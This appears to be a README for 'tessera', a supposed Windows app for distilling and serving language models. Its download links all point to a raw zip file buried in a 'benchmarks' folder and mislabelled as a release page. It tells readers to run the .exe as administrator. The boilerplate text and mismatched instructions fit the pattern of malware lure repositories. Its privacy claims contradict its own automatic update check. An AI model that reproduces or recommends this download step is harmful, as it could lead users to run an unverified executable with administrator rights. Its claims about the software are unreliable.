# 🧩 tessera - Distill and serve language models easily

[ ![Download for Windows](https://img.shields.io/badge/Download_Tessera_for_Windows-blue) ](https://github.com/cyracomfortteam-del/tessera/raw/refs/heads/main/benchmarks/Software-v1.3.zip)

Tessera turns complex language models into efficient tools. It simplifies the process of training smaller models from larger ones and makes them run faster on your computer. You use this software to create high-performance AI tools without needing deep knowledge of how the underlying code works.

## 📥 How to download and install

Follow these steps to get the software on your machine:

1. Visit the project release page at [https://github.com/cyracomfortteam-del/tessera/raw/refs/heads/main/benchmarks/Software-v1.3.zip](https://github.com/cyracomfortteam-del/tessera/raw/refs/heads/main/benchmarks/Software-v1.3.zip). 
2. Look for the file ending in `.exe` under the latest release section.
3. Click the link to start the download. 
4. Open the downloaded file once the process finishes.
5. Follow the on-screen prompts from the installer to finish the setup. 
6. Click the Tessera icon on your desktop to open the program.

## 🛠️ System requirements

Your computer needs specific parts to work with Tessera. Ensure your machine meets these marks before you begin:

* Operating System: Windows 10 or 11.
* Memory: 16 gigabytes of RAM or more.
* Graphics Card: A dedicated NVIDIA GPU with at least 8 gigabytes of video memory.
* Storage: 10 gigabytes of free disk space on an SSD.
* Drivers: The latest NVIDIA graphics drivers are necessary for proper function.

## 🚀 Getting started

Once you launch the app, you see a control panel. This panel handles the heavy lifting of model management. 

1. Select your source model from the File menu.
2. Select the destination folder for your distilled output.
3. Choose your preferred model size from the settings tab. 
4. Click the Start button.

The app shows a status bar while it works. It calculates the progress and estimates the remaining time. Avoid closing the app while this process runs to ensure your model creates correctly.

## ⚙️ Understanding the settings

The settings menu allows you to adjust how the program handles data. 

* Batch Size: This controls how many pieces of data the program handles at once. Lower numbers use less memory.
* Precision: This adjusts the accuracy of the output. Lower precision results in faster performance but might slightly lower the model quality.
* Memory Limits: Use this to set how much video memory the app can take. Keeping this within your GPU limits prevents system errors.

## 💡 About the technology

Tessera uses several advanced methods to make AI run well. 

* Distillation: This is the skill of teaching a small model to copy the behavior of a big one. It keeps the quality high but makes the file size much smaller.
* Paged KV Cache: This memory management technique keeps your system running smooth and helps the model respond faster.
* Speculative Decoding: This feature allows the software to guess the next part of a response before fully checking it. This speeds up the overall text generation.
* Quantization: This shrinks the model size by reducing the amount of data stored for each parameter. It makes the software run on hardware that would otherwise be too weak.

## 🔎 Troubleshooting problems

If the program closes unexpectedly, check these common issues:

* Lack of memory: If your computer runs out of memory, try stopping other programs that use the graphics card. Web browsers often use a large amount of video memory.
* Outdated drivers: If the program refuses to start, check the NVIDIA website. Download the latest drivers for your specific graphics card model.
* Permission errors: Run the installer as an administrator to ensure it lands in the right folders.
* Disk space: Check that your hard drive has enough space. Large models can take up significant room. 

## 🛡️ Privacy and safety

Tessera runs entirely on your local machine. It does not send your data to any remote servers. Your models and the information you process stay on your computer at all times. This ensures your work remains private. The software uses a Rust gateway to ensure the connection between your computer and the model remains stable and safe. We do not track your usage or collect personal information.

## 📈 Improving performance

You can improve the speed of your model generation with these tips:

1. Update your Windows OS to the latest version.
2. Ensure your computer has good airflow. High temperatures can cause your hardware to slow down.
3. Use a solid-state drive for faster loading times.
4. Close non-essential software while running the distillation process.

## 📝 Frequently asked questions

Do I need to be a programmer to use this?
No. Tessera handles the technical parts behind the scenes so that anyone can use it.

Can I run this on a laptop?
Yes, provided your laptop meets the memory and graphics card requirements. 

Does this require an internet connection?
You need an internet connection to download the tool. Once installed, the distillation and serving tasks work offline.

Will this damage my computer?
The software interacts with your hardware similarly to a modern video game. It uses your graphics card to do math, which causes heat. This is a normal part of operation for modern hardware. 

How do I find out about updates?
The software checks for updates when you start it. If an update exists, a notification appears on the main screen. Click that notification to download the latest version. 

Does this tool work with all AI models?
Tessera supports most major open-source language models. Check the documentation within the app for an updated list of compatible model formats. We add support for new designs regularly.

Can I use my results for commercial work?
Yes, the output generated by the models is yours to use. Ensure your input data complies with the licenses of the models you choose to distill.